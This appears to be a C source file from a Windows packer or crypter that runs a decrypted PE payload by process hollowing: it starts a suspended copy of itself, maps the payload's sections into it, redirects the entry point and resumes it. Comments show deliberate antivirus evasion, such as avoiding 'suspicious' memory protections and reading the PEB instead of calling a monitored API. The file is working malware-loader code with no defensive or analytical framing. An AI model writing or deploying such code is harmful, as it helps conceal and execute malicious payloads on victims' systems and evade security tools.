#include <stdint.h>
#include <stdbool.h>
#include <windows.h>
#include <winternl.h>
#include "headers/injection.h"
#include "headers/unpacker.h"

// instead of API call GetModuleFileNameA
void custom_GetModuleFileNameA(char* out, DWORD size)
{
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PRTL_USER_PROCESS_PARAMETERS pProcParams = pPeb->ProcessParameters;
    UNICODE_STRING* pImagePath = &pProcParams->ImagePathName;
    int len = WideCharToMultiByte(CP_ACP, 0, pImagePath->Buffer, pImagePath->Length / 2, out, size, NULL, NULL);
    out[len] = 0;
}

int ProcessHollowing(uint8_t* decrypted, unsigned long payloadSize)
{
    ProcessContext ctx = {0};
    ctx.pe = decrypted;
    ctx.DOSHeader = (PIMAGE_DOS_HEADER)ctx.pe;
    ctx.NtHeader = (IMAGE_NT_HEADERS64*)((uint8_t*)ctx.pe + ctx.DOSHeader->e_lfanew);

    if (ctx.NtHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        return 1;
    }

    custom_GetModuleFileNameA(ctx.currentFilePath, MAX_PATH);
    
    if (!CreateProcessA(ctx.currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &ctx.SI, &ctx.PI))
    {
        return 1;
    }

    ctx.CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
    if (!ctx.CTX)
    {
        TerminateProcess(ctx.PI.hProcess, 1);
        return 1;
    }

    ctx.CTX->ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(ctx.PI.hThread, ctx.CTX))
    {
        goto cleanup;
    }

    ctx.pImageBase = VirtualAllocEx(
        ctx.PI.hProcess,
        (LPVOID)(ctx.NtHeader->OptionalHeader.ImageBase),
        ctx.NtHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!ctx.pImageBase)
    {
        goto cleanup;
    }

    WriteProcessMemory(ctx.PI.hProcess, ctx.pImageBase, ctx.pe, 
        ctx.NtHeader->OptionalHeader.SizeOfHeaders, NULL);

    for (size_t i = 0; i < ctx.NtHeader->FileHeader.NumberOfSections; i++)
    {
        ctx.SectionHeader = (PIMAGE_SECTION_HEADER)(
            (uint8_t*)ctx.pe + ctx.DOSHeader->e_lfanew + 
            sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER))
        );

        WriteProcessMemory(
            ctx.PI.hProcess,
            (LPVOID)((uintptr_t)ctx.pImageBase + ctx.SectionHeader->VirtualAddress),
            (LPVOID)((uintptr_t)ctx.pe + ctx.SectionHeader->PointerToRawData),
            ctx.SectionHeader->SizeOfRawData,
            NULL
        );

        /* Set correct memory protection for each section. 
        Because PAGE_EXECUTE_READWRITE is too suspicious for antiviruses */
        
        DWORD protect = PAGE_NOACCESS;
        DWORD chars = ctx.SectionHeader->Characteristics;
        if (chars & IMAGE_SCN_MEM_EXECUTE)
        {
            if (chars & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_EXECUTE_READWRITE;
            else if (chars & IMAGE_SCN_MEM_READ)
                protect = PAGE_EXECUTE_READ;
            else
                protect = PAGE_EXECUTE;
        } else {
            if (chars & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_READWRITE;
            else if (chars & IMAGE_SCN_MEM_READ)
                protect = PAGE_READONLY;
            else
                protect = PAGE_NOACCESS;
        }
        DWORD oldProtect;
        VirtualProtectEx(
            ctx.PI.hProcess,
            (LPVOID)((uintptr_t)ctx.pImageBase + ctx.SectionHeader->VirtualAddress),
            ctx.SectionHeader->Misc.VirtualSize,
            protect,
            &oldProtect
        );
    }

    WriteProcessMemory(
        ctx.PI.hProcess,
        (LPVOID)(ctx.CTX->Rdx + 0x10),
        &ctx.NtHeader->OptionalHeader.ImageBase,
        sizeof(uint64_t),
        NULL
    );

    ctx.CTX->Rip = (uintptr_t)ctx.pImageBase + ctx.NtHeader->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(ctx.PI.hThread, ctx.CTX);
    ResumeThread(ctx.PI.hThread);
    WaitForSingleObject(ctx.PI.hProcess, INFINITE);

    VirtualFree(ctx.CTX, 0, MEM_RELEASE);
    return 0;

cleanup:
    if (ctx.CTX)
    {
        VirtualFree(ctx.CTX, 0, MEM_RELEASE);
    }
    TerminateProcess(ctx.PI.hProcess, 1);
    return 1;
}
